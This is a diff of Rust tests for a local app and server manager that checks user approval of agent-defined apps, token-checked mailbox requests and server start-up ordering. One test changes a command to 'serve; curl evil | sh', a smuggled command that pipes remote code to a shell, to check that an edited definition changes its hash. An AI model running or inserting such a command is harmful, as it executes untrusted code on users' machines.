+        assert_eq!(c.def.servers["backend"], def("uv run clarity-desktop serve --no-open --port 8765", Some(8765), &[]));
+        assert_eq!((c.def.title.as_deref(), c.def.page.as_ref().map(|p| p.server.as_str()), c.def.servers["frontend"].cwd.as_deref()), (Some("Clarity"), Some("frontend"), Some("web")));
+        assert_eq!(c.def.servers["frontend"].env["API"], "http://127.0.0.1:8765");
+        assert_eq!((c.origin.as_ref().unwrap().by.as_str(), c.approved.as_deref()), ("agent:claude-3", None));
         write(&file, &got).unwrap();
         assert_eq!(read(&file).unwrap(), got);
         assert!(!fs::read_to_string(&file).unwrap().contains("\"env\": {}"), "what is not set is not written");
         for (wrong, says) in [
-            (r#"{ "servers": { "a": { "cmd": "x", "prot": 1 } } }"#, "unknown key \"prot\""),
-            (r#"{ "servers": { "a": { "cmd": "x", "port": 70000 } } }"#, "a: "),
-            (r#"{ "servers": { "a": { "port": 1 } } }"#, "cmd"),
-            (r#"{ "servers": [] }"#, "must be an object"),
-            ("{ not json", "serve.json"),
+            (r#"{ "apps": { "a": { "servers": { "s": { "cmd": "x", "prot": 1 } } } } }"#, "unknown key \"prot\""),
+            (r#"{ "apps": { "a": { "titel": "A", "servers": {} } } }"#, "unknown key \"titel\""),
+            (r#"{ "apps": { "a": { "servers": { "s": { "cmd": "x", "port": 70000 } } } } }"#, "a: "),
+            (r#"{ "apps": { "a": { "servers": { "s": { "port": 1 } } } } }"#, "cmd"),
+            (r#"{ "apps": { "a": { "title": "A" } } }"#, "\"servers\" is needed"),
+            (r#"{ "apps": [] }"#, "must be an object"),
+            ("{ not json", "apps.json"),
         ] {
             fs::write(&file, wrong).unwrap();
             let e = read(&file).unwrap_err();
@@ -895,14 +1171,33 @@ mod tests {
     }
 
     #[test]
-    fn a_definition_from_options() {
-        let d = parse_def(&["--cmd", "npm run dev", "--port", "5173", "--after", "api,db", "--view", "/app", "--env", "A=1", "--env", "B=x=y", "--cwd", "web", "--title", "App"]).unwrap();
-        assert_eq!((d.cmd.as_str(), d.port, d.after.join(" ").as_str(), d.view.as_deref()), ("npm run dev", Some(5173), "api db", Some("/app")));
-        assert_eq!((d.env["A"].as_str(), d.env["B"].as_str(), d.cwd.as_deref(), d.title.as_deref()), ("1", "x=y", Some("web"), Some("App")));
-        assert!(parse_def(&["--port", "1"]).unwrap_err().contains("--cmd"));
-        assert!(parse_def(&["--cmd", "x", "--port", "99999"]).unwrap_err().contains("--port"));
-        assert!(parse_def(&["--cmd", "x", "--env", "A"]).unwrap_err().contains("NAME=VALUE"));
-        assert!(parse_def(&["--cmd"]).unwrap_err().contains("needs a value"));
+    fn the_hash_names_the_definition_and_nothing_else() {
+        let a = app(&[("api", def("serve", Some(8765), &[]))], None);
+        let mut b = a.clone();
+        assert_eq!(hash(&a), hash(&b));
+        assert_eq!(hash(&a).len(), 64);
+        b.servers.get_mut("api").unwrap().cmd = "serve; curl evil | sh".into();
+        assert_ne!(hash(&a), hash(&b));
+    }
+
+    #[test]
+    fn set_reads_its_json_where_the_agent_is() {
+        let d = temp("json");
+        let f = d.join("app.json");
+        fs::write(&f, r#"{ "servers": { "s": { "cmd": "x" } } }"#).unwrap();
+        let s = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+        let mut args = s(&["set", "demo", "--json", &f.display().to_string()]);
+        json_arg(&mut args, || unreachable!()).unwrap();
+        assert_eq!(args, s(&["set", "demo", r#"{ "servers": { "s": { "cmd": "x" } } }"#]));
+        let mut args = s(&["set", "demo", "--json", "-"]);
+        json_arg(&mut args, || Ok("{}".into())).unwrap();
+        assert_eq!(args, s(&["set", "demo", "{}"]));
+        assert!(json_arg(&mut s(&["set", "demo", "--cmd", "x"]), || unreachable!()).unwrap_err().contains("--json"));
+        assert!(json_arg(&mut s(&["set", "demo", "--json", "/no/such/file.json"]), || unreachable!()).is_err());
+        let mut list = s(&["list"]);
+        json_arg(&mut list, || unreachable!()).unwrap();
+        assert_eq!(list, s(&["list"]));
+        let _ = fs::remove_dir_all(&d);
     }
 
     #[test]
@@ -934,7 +1229,6 @@ mod tests {
         p.note("nib: not started");
         assert_eq!(p.lines(), ["half a line", "nib: not started"]);
     }
-
     /// Windows' ConPTY repaints the screen when the window resizes the terminal: the log says
     /// each line once, whole.
     #[cfg(windows)]
@@ -943,52 +1237,38 @@ mod tests {
         let (s, _rx, d) = servers("resize");
         let line = r"Serving notebooks from local directory: C:\Users\me\src\explorer_v2\reports\notebooks\and\on";
         let cmd = format!("echo {line} & echo second line & ping -n 8 127.0.0.1 >NUL");
-        s.lock().unwrap().request(ServeOp::Set { name: "p".into(), def: def(&cmd, None, &[]) }).unwrap();
-        s.lock().unwrap().request(ServeOp::Up { names: vec![] }).unwrap();
-        until("its terminal", || s.lock().unwrap().runs.get("p").is_some_and(|r| r.pty.is_some()));
+        s.lock().unwrap().request(AppOp::Set { name: "p".into(), def: app(&[("p", def(&cmd, None, &[]))], None) }, true).unwrap();
+        s.lock().unwrap().request(AppOp::Up { names: vec![] }, true).unwrap();
+        until("its terminal", || s.lock().unwrap().runs.get("p/p").is_some_and(|r| r.pty.is_some()));
         let ptys = s.lock().unwrap().ptys.clone();
-        let id = s.lock().unwrap().runs["p"].pty.unwrap();
+        let id = s.lock().unwrap().runs["p/p"].pty.unwrap();
         // ConPTY asks where the cursor is before it shows anything; the window's terminal answers.
         thread::sleep(Duration::from_millis(300));
         ptys.lock().unwrap().input(id, b"\x1b[1;1R");
-        until("its output", || s.lock().unwrap().log("p", 10).is_some_and(|l| l.contains("second line")));
+        until("its output", || s.lock().unwrap().log("p/p", 10).is_some_and(|l| l.contains("second line")));
         for (cols, rows) in [(50, 20), (120, 30), (70, 24)] {
             ptys.lock().unwrap().resize(id, cols, rows);
             thread::sleep(Duration::from_millis(400));
         }
-        let log = s.lock().unwrap().log("p", 50).unwrap();
+        let log = s.lock().unwrap().log("p/p", 50).unwrap();
         assert_eq!(log.matches("Serving notebooks").count(), 1, "{log}");
         assert_eq!(log.matches("second line").count(), 1, "{log}");
         assert!(log.lines().any(|l| l.trim() == line), "{log}");
         drop(s);
         let _ = fs::remove_dir_all(&d);
     }
-
-    #[test]
-    fn a_view_git_bash_rewrote_is_given_back() {
-        let git = || Some("C:/Users/me/AppData/Local/Programs/Git/".to_string());
-        assert_eq!(unmangle_view("C:/Users/me/AppData/Local/Programs/Git/src/pages/x.html", git), Ok("/src/pages/x.html".into()));
-        assert_eq!(unmangle_view("c:\\users\\me\\appdata\\local\\programs\\git\\lab", git), Ok("/lab".into()));
-        assert_eq!(unmangle_view("/src/x.html", || panic!("not asked")), Ok("/src/x.html".into()));
-        assert_eq!(unmangle_view("//src/x.html", || None), Ok("/src/x.html".into()));
-        // A drive path that is not Git Bash's doing, or with no Git Bash to ask: refused, with the way round.
-        assert!(unmangle_view("D:/work/x.html", git).unwrap_err().contains("MSYS_NO_PATHCONV=1"));
-        assert!(unmangle_view("C:/Users/me/AppData/Local/Programs/Git/src", || None).is_err());
-        assert!(unmangle_view("C:/Users/me/AppData/Local/Programs/Gitx/a", git).is_err());
-    }
-
     #[test]
     fn up_says_when_it_stopped_waiting_and_why() {
         assert_eq!(after_wait(&(String::new(), 0), 60), None);
-        let (note, code) = after_wait(&("frontend".into(), 3), 60).unwrap();
-        assert!(note.contains("not ready after 60 s: frontend") && code == 3, "{note}");
+        let (note, code) = after_wait(&("demo/web".into(), 3), 60).unwrap();
+        assert!(note.contains("not ready after 60 s: demo/web") && code == 3, "{note}");
         // Asked not to wait: nothing to say about it.
-        assert_eq!(after_wait(&("frontend".into(), 3), 0), None);
-        let (note, code) = after_wait(&("api (port-taken)".into(), 0), 60).unwrap();
-        assert!(note.contains("api (port-taken)") && code == 1, "{note}");
+        assert_eq!(after_wait(&("demo/web".into(), 3), 0), None);
+        let (note, code) = after_wait(&("demo/api (port-taken)".into(), 0), 60).unwrap();
+        assert!(note.contains("demo/api (port-taken)") && code == 1, "{note}");
     }
 
-    /// Servers in a throwaway project, and what the window would be told.
+    /// Apps in a throwaway project, and what the window would be told.
     fn servers(tag: &str) -> (Shared, mpsc::Receiver<ServerMsg>, PathBuf) {
         let d = temp(tag);
         for sub in ["root", "nibdir", "mailbox"] {
@@ -998,8 +1278,12 @@ mod tests {
         (new(&d.join("root"), Some(&d.join("nibdir")), None, &d.join("mailbox"), Default::default(), tx), rx, d)
     }
 
-    fn state_of(s: &Shared, name: &str) -> ServerState {
-        s.lock().unwrap().request(ServeOp::List).unwrap().into_iter().find(|i| i.name == name).map(|i| i.state).unwrap()
+    fn info(s: &Shared, name: &str) -> AppInfo {
+        s.lock().unwrap().request(AppOp::List, true).unwrap().into_iter().find(|i| i.name == name).unwrap()
+    }
+
+    fn state_of(s: &Shared, app: &str, server: &str) -> ServerState {
+        info(s, app).servers.into_iter().find(|i| i.name == server).map(|i| i.state).unwrap()
     }
 
     fn until(what: &str, f: impl Fn() -> bool) {
@@ -1010,39 +1294,143 @@ mod tests {
         }
     }
 
+    #[test]
+    fn only_the_user_approves_and_the_user_starts_only_what_they_approved() {
+        let (s, _rx, d) = servers("approve");
+        let agent = Who::Agent("claude-7".into());
+        let other = Who::Agent("codex-8".into());
+        let act = |op: AppOp, who: &Who| s.lock().unwrap().act(op, who);
+        let job = app(&[("job", def(sleeper(), None, &[]))], None);
+        // An agent's app waits; the user is told so, and so is everyone else but that agent.
+        act(AppOp::Set { name: "demo".into(), def: job.clone() }, &agent).unwrap();
+        let a = info(&s, "demo");
+        assert!(!a.approved);
+        assert_eq!(a.origin.as_ref().unwrap().by, "agent:claude-7");
+        assert!(act(AppOp::Up { names: vec!["demo".into()] }, &Who::User).unwrap_err().contains("not approved yet"));
+        assert!(act(AppOp::Up { names: vec!["demo".into()] }, &Who::Ctl).unwrap_err().contains("waits for the user's approval"));
+        assert!(act(AppOp::Up { names: vec!["demo".into()] }, &other).unwrap_err().contains("waits for the user's approval"));
+        assert!(act(AppOp::Restart { name: "demo".into(), server: None }, &Who::User).is_err());
+        assert!(act(AppOp::Up { names: vec![] }, &Who::User).unwrap_err().contains("no app is approved"));
+        // Only the user approves, and only what they were shown.
+        assert!(act(AppOp::Approve { name: "demo".into(), hash: a.hash.clone() }, &agent).unwrap_err().contains("only the user"));
+        assert!(act(AppOp::Approve { name: "demo".into(), hash: a.hash.clone() }, &Who::Ctl).unwrap_err().contains("only the user"));
+        assert!(act(AppOp::Approve { name: "demo".into(), hash: "0".repeat(64) }, &Who::User).unwrap_err().contains("changed since"));
+        act(AppOp::Approve { name: "demo".into(), hash: a.hash.clone() }, &Who::User).unwrap();
+        assert!(info(&s, "demo").approved);
+        // A change by anybody but the user takes the approval away.
+        let mut changed = job.clone();
+        changed.servers.get_mut("job").unwrap().cmd = format!("echo hi & {}", sleeper());
+        act(AppOp::Set { name: "demo".into(), def: changed.clone() }, &other).unwrap();
+        assert!(!info(&s, "demo").approved);
+        assert!(act(AppOp::Up { names: vec!["demo".into()] }, &agent).unwrap_err().contains("defined by agent:codex-8"), "now the other agent's");
+        // The user's own definition needs no second look.
+        act(AppOp::Set { name: "mine".into(), def: job.clone() }, &Who::User).unwrap();
+        assert!(info(&s, "mine").approved);
+        // Every change is in the log.
+        let log = fs::read_to_string(d.join("nibdir/apps.log.jsonl")).unwrap();
+        assert_eq!(log.lines().count(), 4, "{log}");
+        assert!(log.contains("\"did\":\"approve\"") && log.contains("\"by\":\"agent:codex-8\""));
+        drop(s);
+        let _ = fs::remove_dir_all(&d);
+    }
+
+    #[test]
+    fn an_agent_starts_the_app_it_defined_and_up_all_skips_what_waits() {
+        let (s, rx, d) = servers("own");
+        let agent = Who::Agent("claude-7".into());
+        let act = |op: AppOp, who: &Who| s.lock().unwrap().act(op, who);
+        act(AppOp::Set { name: "mine".into(), def: app(&[("job", def(sleeper(), None, &[]))], None) }, &agent).unwrap();
+        act(AppOp::Set { name: "yours".into(), def: app(&[("job", def(sleeper(), None, &[]))], None) }, &Who::User).unwrap();
+        act(AppOp::Up { names: vec!["mine".into()] }, &agent).unwrap();
+        until("mine to run", || state_of(&s, "mine", "job") == ServerState::Ready);
+        act(AppOp::Down { names: vec![] }, &Who::User).unwrap();
+        assert_eq!(state_of(&s, "mine", "job"), ServerState::Stopped);
+        // The user's "start everything" starts what they approved, and says what it left.
+        act(AppOp::Up { names: vec![] }, &Who::User).unwrap();
+        until("yours to run", || state_of(&s, "yours", "job") == ServerState::Ready);
+        assert_eq!(state_of(&s, "mine", "job"), ServerState::Stopped);
+        assert!(rx.try_iter().any(|m| matches!(m, ServerMsg::Notify(ServerNotify::Log { msg, .. }) if msg.contains("waiting for approval: mine"))));
+        act(AppOp::Remove { name: "yours".into() }, &Who::User).unwrap();
+        assert!(s.lock().unwrap().runs.keys().all(|k| app_of(k) != "yours"), "removed: its servers are gone");
+        drop(s);
+        let _ = fs::remove_dir_all(&d);
+    }
+
+    #[test]
+    fn an_agent_asks_through_the_mailbox_with_its_token() {
+        let (s, _rx, d) = servers("agent");
+        let dir = d.join("mailbox/app");
+        fs::create_dir_all(dir.join("req")).unwrap();
+        fs::create_dir_all(dir.join("res")).unwrap();
+        let token = crate::tokens::issue("claude-test-mailbox");
+        let args = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+        let json = format!(r#"{{ "title": "Job", "servers": {{ "job": {{ "cmd": "echo agent says hi & {}" }} }} }}"#, sleeper());
+        let (out, code) = ask(&dir, &token, &args(&["set", "job", &json]));
+        assert_eq!(code, 0, "{out}");
+        assert!(out.contains("waits for the user's approval (defined by agent:claude-test-mailbox)"), "{out}");
+        assert_eq!(ask(&dir, &token, &args(&["set", "job", "{ \"servers\": 1 }"])).1, 2);
+        // Without the token, or with another, nothing is done.
+        for t in ["", "0123456789abcdef0123456789abcdef"] {
+            let (out, code) = ask(&dir, t, &args(&["up", "job"]));
+            assert!(code == 1 && out.contains("refused"), "{out}");
+        }
+        assert_eq!(state_of(&s, "job", "job"), ServerState::Stopped);
+        // With it, the agent starts what it defined.
+        let (out, code) = ask(&dir, &token, &args(&["open", "job"]));
+        assert!(code == 0 && out.starts_with("job  \"Job\""), "{out}");
+        until("settled", || ask(&dir, &token, &args(&["settled", "job"])).1 == 0);
+        assert!(ask(&dir, &token, &args(&["list"])).0.contains("ready"));
+        // ConPTY asks where the cursor is before it shows anything; the window's terminal answers.
+        if cfg!(windows) {
+            let (ptys, id) = {
+                let g = s.lock().unwrap();
+                (g.ptys.clone(), g.runs["job/job"].pty.unwrap())
+            };
+            thread::sleep(Duration::from_millis(300));
+            ptys.lock().unwrap().input(id, b"\x1b[1;1R");
+        }
+        until("its output", || ask(&dir, &token, &args(&["log", "job", "--lines", "5"])).0.contains("agent says hi"));
+        assert_eq!(ask(&dir, &token, &args(&["down"])).1, 0);
+        assert!(ask(&dir, &token, &args(&["list"])).0.contains("stopped"));
+        assert_eq!(ask(&dir, &token, &args(&["restart", "nobody"])).1, 1);
+        assert_eq!(ask(&dir, &token, &args(&["dance"])).1, 2);
+        drop(s);
+        let _ = fs::remove_dir_all(&d);
+    }
+
     #[cfg(unix)]
     #[test]
     fn a_server_runs_in_a_terminal_until_it_is_stopped() {
         let (s, rx, d) = servers("run");
-        let set = |name: &str, def: ServerDef| s.lock().unwrap().request(ServeOp::Set { name: name.into(), def });
-        assert!(s.lock().unwrap().request(ServeOp::Up { names: vec![] }).unwrap_err().msg.contains("no servers"));
-        assert!(set("Bad", def("x", None, &[])).is_err());
-        set("sleeper", def("echo hello from the server; sleep 30", None, &[])).unwrap();
-        set("short", def("exit 3", None, &[])).unwrap();
-        assert!(d.join("nibdir/serve.json").is_file());
-        assert_eq!(state_of(&s, "sleeper"), ServerState::Stopped);
-        assert!(s.lock().unwrap().request(ServeOp::Up { names: vec!["nobody".into()] }).unwrap_err().msg.contains("sleeper"));
-        s.lock().unwrap().request(ServeOp::Up { names: vec![] }).unwrap();
+        let set = |name: &str, def: AppDef| s.lock().unwrap().request(AppOp::Set { name: name.into(), def }, true);
+        assert!(s.lock().unwrap().request(AppOp::Up { names: vec![] }, true).unwrap_err().msg.contains("no apps"));
+        assert!(set("Bad", app(&[("x", def("x", None, &[]))], None)).is_err());
+        set("sleeper", app(&[("main", def("echo hello from the server; sleep 30", None, &[]))], None)).unwrap();
+        set("short", app(&[("main", def("exit 3", None, &[]))], None)).unwrap();
+        assert!(d.join("nibdir/apps.json").is_file());
+        assert_eq!(state_of(&s, "sleeper", "main"), ServerState::Stopped);
+        assert!(s.lock().unwrap().request(AppOp::Up { names: vec!["nobody".into()] }, true).unwrap_err().msg.contains("sleeper"));
+        s.lock().unwrap().request(AppOp::Up { names: vec![] }, true).unwrap();
         // No port: ready as soon as it runs.
-        until("sleeper to run", || state_of(&s, "sleeper") == ServerState::Ready);
-        until("short to end", || state_of(&s, "short") == ServerState::Exited(Some(3)));
-        until("its output", || s.lock().unwrap().log("sleeper", 5).is_some_and(|l| l.contains("hello from the server")));
+        until("sleeper to run", || state_of(&s, "sleeper", "main") == ServerState::Ready);
+        until("short to end", || state_of(&s, "short", "main") == ServerState::Exited(Some(3)));
+        until("its output", || s.lock().unwrap().log("sleeper/main", 5).is_some_and(|l| l.contains("hello from the server")));
         // The window heard of the terminal before its first output.
         let msgs: Vec<ServerMsg> = rx.try_iter().collect();
-        let pty = s.lock().unwrap().runs["sleeper"].pty.unwrap();
-        let told = msgs.iter().position(|m| matches!(m, ServerMsg::Notify(ServerNotify::Server(i)) if i.name == "sleeper" && i.pty == Some(pty))).unwrap();
+        let pty = s.lock().unwrap().runs["sleeper/main"].pty.unwrap();
+        let told = msgs.iter().position(|m| matches!(m, ServerMsg::Notify(ServerNotify::App(i)) if i.name == "sleeper" && i.servers.iter().any(|s| s.pty == Some(pty)))).unwrap();
         let printed = msgs.iter().position(|m| matches!(m, ServerMsg::Notify(ServerNotify::PtyOutput { id, .. }) if *id == pty)).unwrap();
         assert!(told < printed);
         // Closing its terminal stops it; so does `down`; a removed one is forgotten.
         s.lock().unwrap().closed(pty);
-        assert_eq!(state_of(&s, "sleeper"), ServerState::Stopped);
-        s.lock().unwrap().request(ServeOp::Restart { name: "sleeper".into() }).unwrap();
-        until("sleeper to run again", || state_of(&s, "sleeper") == ServerState::Ready);
-        s.lock().unwrap().request(ServeOp::Down { names: vec![] }).unwrap();
-        assert_eq!((state_of(&s, "sleeper"), state_of(&s, "short")), (ServerState::Stopped, ServerState::Stopped));
-        let left = s.lock().unwrap().request(ServeOp::Remove { name: "short".into() }).unwrap();
+        assert_eq!(state_of(&s, "sleeper", "main"), ServerState::Stopped);
+        s.lock().unwrap().request(AppOp::Restart { name: "sleeper".into(), server: None }, true).unwrap();
+        until("sleeper to run again", || state_of(&s, "sleeper", "main") == ServerState::Ready);
+        s.lock().unwrap().request(AppOp::Down { names: vec![] }, true).unwrap();
+        assert_eq!((state_of(&s, "sleeper", "main"), state_of(&s, "short", "main")), (ServerState::Stopped, ServerState::Stopped));
+        let left = s.lock().unwrap().request(AppOp::Remove { name: "short".into() }, true).unwrap();
         assert_eq!(left.iter().map(|i| i.name.as_str()).collect::<Vec<_>>(), ["sleeper"]);
-        assert!(rx.try_iter().any(|m| matches!(m, ServerMsg::Notify(ServerNotify::Server(i)) if i.name == "short" && i.removed)));
+        assert!(rx.try_iter().any(|m| matches!(m, ServerMsg::Notify(ServerNotify::App(i)) if i.name == "short" && i.removed)));
         drop(s);
         let _ = fs::remove_dir_all(&d);
     }
@@ -1059,20 +1447,18 @@ mod tests {
             let l = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
             l.local_addr().unwrap().port()
         };
-        let set = |name: &str, def: ServerDef| s.lock().unwrap().request(ServeOp::Set { name: name.into(), def }).unwrap();
-        set("taken", def("sleep 30", Some(taken), &[]));
-        set("slow", def("sleep 30", Some(free), &[]));
-        set("next", def("sleep 30", None, &["slow"]));
-        // Asking for the last one brings up the one it comes after.
-        s.lock().unwrap().request(ServeOp::Up { names: vec!["next".into(), "taken".into()] }).unwrap();
-        until("port-taken", || state_of(&s, "taken") == ServerState::PortTaken);
-        assert!(s.lock().unwrap().runs["taken"].pty.is_none(), "not started");
-        until("slow to start", || state_of(&s, "slow") == ServerState::Starting);
+        let set = |name: &str, def: AppDef| s.lock().unwrap().request(AppOp::Set { name: name.into(), def }, true).unwrap();
+        set("taken", app(&[("main", def("sleep 30", Some(taken), &[]))], None));
+        set("pair", app(&[("slow", def("sleep 30", Some(free), &[])), ("next", def("sleep 30", None, &["slow"]))], None));
+        s.lock().unwrap().request(AppOp::Up { names: vec!["pair".into(), "taken".into()] }, true).unwrap();
+        until("port-taken", || state_of(&s, "taken", "main") == ServerState::PortTaken);
+        assert!(s.lock().unwrap().runs["taken/main"].pty.is_none(), "not started");
+        until("slow to start", || state_of(&s, "pair", "slow") == ServerState::Starting);
         thread::sleep(TICK * 3);
-        assert_eq!((state_of(&s, "slow"), state_of(&s, "next")), (ServerState::Starting, ServerState::Waiting));
+        assert_eq!((state_of(&s, "pair", "slow"), state_of(&s, "pair", "next")), (ServerState::Starting, ServerState::Waiting));
         let _listening = std::net::TcpListener::bind(("127.0.0.1", free)).unwrap();
-        until("slow to be ready", || state_of(&s, "slow") == ServerState::Ready);
-        until("next to run", || state_of(&s, "next") == ServerState::Ready);
+        until("slow to be ready", || state_of(&s, "pair", "slow") == ServerState::Ready);
+        until("next to run", || state_of(&s, "pair", "next") == ServerState::Ready);
         drop(s);
         let _ = fs::remove_dir_all(&d);
     }
@@ -1085,24 +1471,15 @@ mod tests {
             let l = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
             l.local_addr().unwrap().port()
         };
-        let set = |name: &str, def: ServerDef| s.lock().unwrap().request(ServeOp::Set { name: name.into(), def }).unwrap();
+        let set = |name: &str, def: AppDef| s.lock().unwrap().request(AppOp::Set { name: name.into(), def }, true).unwrap();
         // The backend ends at once, without ever listening.
-        set("backend", def("exit 7", Some(free), &[]));
-        set("frontend", def("sleep 30", None, &["backend"]));
-        s.lock().unwrap().request(ServeOp::Up { names: vec!["frontend".into()] }).unwrap();
-        until("backend to end", || state_of(&s, "backend") == ServerState::Exited(Some(7)));
-        until("frontend to give up", || state_of(&s, "frontend") == ServerState::Exited(None));
-        assert!(s.lock().unwrap().runs["frontend"].pty.is_none(), "never started");
-        assert!(s.lock().unwrap().log("frontend", 5).unwrap().contains("backend, which it comes after, is exited(7)"));
+        set("demo", app(&[("backend", def("exit 7", Some(free), &[])), ("frontend", def("sleep 30", None, &["backend"]))], None));
+        s.lock().unwrap().request(AppOp::Up { names: vec!["demo".into()] }, true).unwrap();
+        until("backend to end", || state_of(&s, "demo", "backend") == ServerState::Exited(Some(7)));
+        until("frontend to give up", || state_of(&s, "demo", "frontend") == ServerState::Exited(None));
+        assert!(s.lock().unwrap().runs["demo/frontend"].pty.is_none(), "never started");
+        assert!(s.lock().unwrap().log("demo/frontend", 5).unwrap().contains("backend, which it comes after, is exited(7)"));
         assert!(rx.try_iter().any(|m| matches!(m, ServerMsg::Notify(ServerNotify::Log { msg, .. }) if msg.contains("frontend") && msg.contains("backend"))));
-        // Stopped by the user while the other waits: the same.
-        set("slow", def("sleep 30", Some(free), &[]));
-        set("next", def("sleep 30", None, &["slow"]));
-        s.lock().unwrap().request(ServeOp::Up { names: vec!["next".into()] }).unwrap();
-        until("slow to start", || state_of(&s, "slow") == ServerState::Starting);
-        assert_eq!(state_of(&s, "next"), ServerState::Waiting);
-        s.lock().unwrap().request(ServeOp::Down { names: vec!["slow".into()] }).unwrap();
-        until("next to give up", || state_of(&s, "next") == ServerState::Exited(None));
         drop(s);
         let _ = fs::remove_dir_all(&d);
     }
@@ -1116,28 +1493,5 @@ mod tests {
             return;
         }
         assert!(listening(port), "[::1]:{port} answers");
-    }
-
-    #[cfg(unix)]
-    #[test]
-    fn an_agent_asks_through_the_mailbox_folder() {
-        let (s, _rx, d) = servers("agent");
-        let dir = d.join("mailbox/serve");
-        fs::create_dir_all(dir.join("req")).unwrap();
-        fs::create_dir_all(dir.join("res")).unwrap();
-        let args = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
-        assert_eq!(ask(&dir, &args(&["set", "job", "--cmd", "echo agent says hi; sleep 30"])).1, 0);
-        assert_eq!(ask(&dir, &args(&["set", "job"])), ("nib-serve set: --cmd \"…\" is needed".to_string(), 2));
-        let (out, code) = ask(&dir, &args(&["up", "job"]));
-        assert!(code == 0 && out.starts_with("job  "), "{out}");
-        until("settled", || ask(&dir, &args(&["settled", "job"])).1 == 0);
-        assert!(ask(&dir, &args(&["list"])).0.contains("ready"));
-        until("its output", || ask(&dir, &args(&["log", "job", "--lines", "3"])).0.contains("agent says hi"));
-        assert_eq!(ask(&dir, &args(&["down"])).1, 0);
-        assert!(ask(&dir, &args(&["list"])).0.contains("stopped"));
-        assert_eq!(ask(&dir, &args(&["restart", "nobody"])).1, 1);
-        assert_eq!(ask(&dir, &args(&["dance"])).1, 2);
-        drop(s);
-        let _ = fs::remove_dir_all(&d);
     }
 }
